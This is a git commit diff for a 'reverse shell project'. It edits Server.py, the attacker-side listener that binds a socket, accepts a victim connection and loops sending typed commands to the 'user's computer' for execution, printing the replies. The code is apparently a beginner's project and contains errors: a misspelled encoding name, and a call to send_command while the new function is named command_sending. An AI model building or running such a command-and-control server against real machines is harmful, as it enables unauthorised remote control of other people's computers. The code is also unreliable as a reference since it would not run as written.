2d0590d4eb14f717d2ac6981fc3cbdad7be2a9fb
ETHAN <ETHAN@ETHAN>
2020-02-13 15:09:22 +0200

    REVERSE SHELL PROJECT
    Signed-off-by: ETHAN <ETHAN@ETHAN>

--- REVERSE SHELL PROJECT/Server.py
+++ REVERSE SHELL PROJECT/Server.py
@@ -21,9 +21,9 @@ def bind_the_socket():
         global port
         global s
 
-        print("Port binding" + str(port))
+        print("Port binding number " + str(port))
 
-        s.bind(host,port)
+        s.bind((host, port))
         s.listen(5)
     except socket.error as msg:
         print("Socket binding error" + str(msg) + "\n" + "Retrying...")
@@ -31,7 +31,7 @@ def bind_the_socket():
 
 # Accept connection after listening
 
-def astablishing_socket():
+def establishing_socket():
     
     # Storing data info
     conn,address = s.accept()
@@ -40,3 +40,24 @@ def astablishing_socket():
     # Sending the command to user's computer to execute CMD on their computer
     send_command(conn)
     conn.close()
+
+# Sending command to client computer
+
+def command_sending(conn):
+    # The purpose of having infinite loop is to NOT let the connection close after executing the command
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024),"uft-8")
+            print(client_response, end="")
+    
+def main():
+    making_socket()
+    bind_the_socket()
+    establishing_socket()
+main()
